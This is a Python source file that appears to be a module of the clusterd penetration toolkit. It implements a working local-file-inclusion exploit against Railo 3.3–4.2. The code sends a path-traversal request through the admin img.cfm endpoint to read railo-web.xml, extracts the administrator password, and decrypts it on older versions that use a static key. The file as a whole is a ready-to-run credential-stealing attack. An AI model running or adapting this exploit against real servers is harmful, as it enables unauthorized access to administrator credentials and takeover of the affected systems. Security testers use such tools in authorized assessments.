from auxiliary import Auxiliary
from subprocess import check_output
from log import LOG
import utility
import re


class Auxiliary:

    def __init__(self):
        self.name = 'Railo Password LFI'
        self.versions = ['3.3', '4.0', '4.1', '4.2']
        self.flag = 'rl-pw'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """ Exploit a trivial LFI to pull an encrypted password, which we can
        then decrypt on Railo <= 4.0.  This only works on express versions of
        Railo, as the Jetty instance is the real culprit here.
        """                

        utility.Msg("Attempting to pull password...")

        base = "http://{0}:{1}/railo-context/admin/img.cfm?attributes.src="\
               "../../../../railo-web.xml&thistag.executionmode=start"\
                                            .format(fingerengine.options.ip, 
                                                    fingerprint.port)
        
        response = utility.requests_get(base)
        if response.status_code is 200:
            data = re.findall("railo-configuration p.*w*?=\"(.*?)\" ", response.content)
            if len(data) > 0:
                
                # determine whether we can decrypt this or not
                if fingerprint.version in ['3.0', '3.3', '4.0']:
                    utility.Msg("Fetched encrypted password, decrypting...")
                    utility.Msg("Decrypted password: %s" % self.decrypt(data[0]), LOG.SUCCESS)
                else:
                    utility.Msg("Fetched password hash: %s" % data[0], LOG.SUCCESS)

        elif response.status_code is 400:
            utility.Msg("Could not retrieve file; likely that the remote Railo instance is not express", LOG.ERROR)
        else:
            utility.Msg("Failed to retrieve file (HTTP %d)" % response.status_code, LOG.ERROR)

    def decrypt(self, password):
        """ Dear Railo,

                Stop encrypting passwords with a static key.

            Love,

                clusterd
        """

        res = None
        try:
            res = check_output(["./railopass.sh", password],
                                cwd='./src/lib/railo/railopass')
        except Exception, e:
            utility.Msg(e, LOG.DEBUG)
            res = e

        return res.strip()
